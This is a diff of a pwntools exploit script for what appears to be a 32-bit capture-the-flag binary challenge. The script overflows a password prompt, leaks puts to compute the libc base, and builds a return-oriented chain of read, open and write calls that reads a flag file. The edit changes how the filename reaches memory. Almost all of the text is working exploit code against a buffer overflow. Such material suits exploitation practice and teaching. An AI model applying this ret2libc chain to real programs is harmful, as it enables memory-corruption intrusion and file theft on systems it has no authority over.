@@ -22,30 +22,22 @@ io.sendlineafter(b'Password:', payload)
 io.recvuntil(b'Password!\n')
 puts_addr = u32(io.recv(4))
 base_addr = puts_addr - libc.symbols['puts']
-print('puts_addr = ', hex(puts_addr))
-print('base_addr = ', hex(base_addr))
-# 2: get the stack address and calculate the address of string
-environ = base_addr + libc.symbols['environ']
+# print('puts_addr = ', hex(puts_addr))
+# print('base_addr = ', hex(base_addr))
+# 2: get the flag
 payload = cyclic(76) 
-payload += p32(elf.plt['puts'])
-payload += p32(PR)
-payload += p32(environ)
-payload += p32(elf.symbols['start'])
-io.sendlineafter(b'Password:', payload)
-io.recvuntil(b'Password!\n')
-stack_addr = u32(io.recv(4))
-print('stack_addr = ', hex(stack_addr))
-# 3: get the address of string and calculate the address of writable_addr
-string_addr = stack_addr - 284
-print('string_addr = ', hex(string_addr))
-# 4: get the flag
-fileName = b'/tmp/flag\0' 
-payload = fileName + cyclic(76 - len(fileName)) 
+# read the "/tmp/flag" into the writable_addr
+# read(0, writable_addr, len("/tmp/flag"))
+payload += p32(base_addr + libc.symbols['read'])
+payload += p32(base_addr + PPPR)
+payload += p32(0)
+payload += p32(writable_addr)
+payload += p32(len("/tmp/flag"))
 # open the /tmp/flag
 # open("/tmp/flag", 0)
 payload += p32(base_addr + libc.symbols['open'])
 payload += p32(base_addr + PPR)
-payload += p32(string_addr)
+payload += p32(writable_addr)
 payload += p32(0)
 # read the flag
 # read(3, writable_addr, 10)
@@ -61,7 +53,8 @@ payload += p32(base_addr + PPPR)
 payload += p32(1)
 payload += p32(writable_addr)
 payload += p32(10)
-io.sendafter(b'Password:', payload)
+io.sendlineafter(b'Password:', payload)
+io.sendlineafter(b'!', b'/tmp/flag')
 io.interactive()
 
 
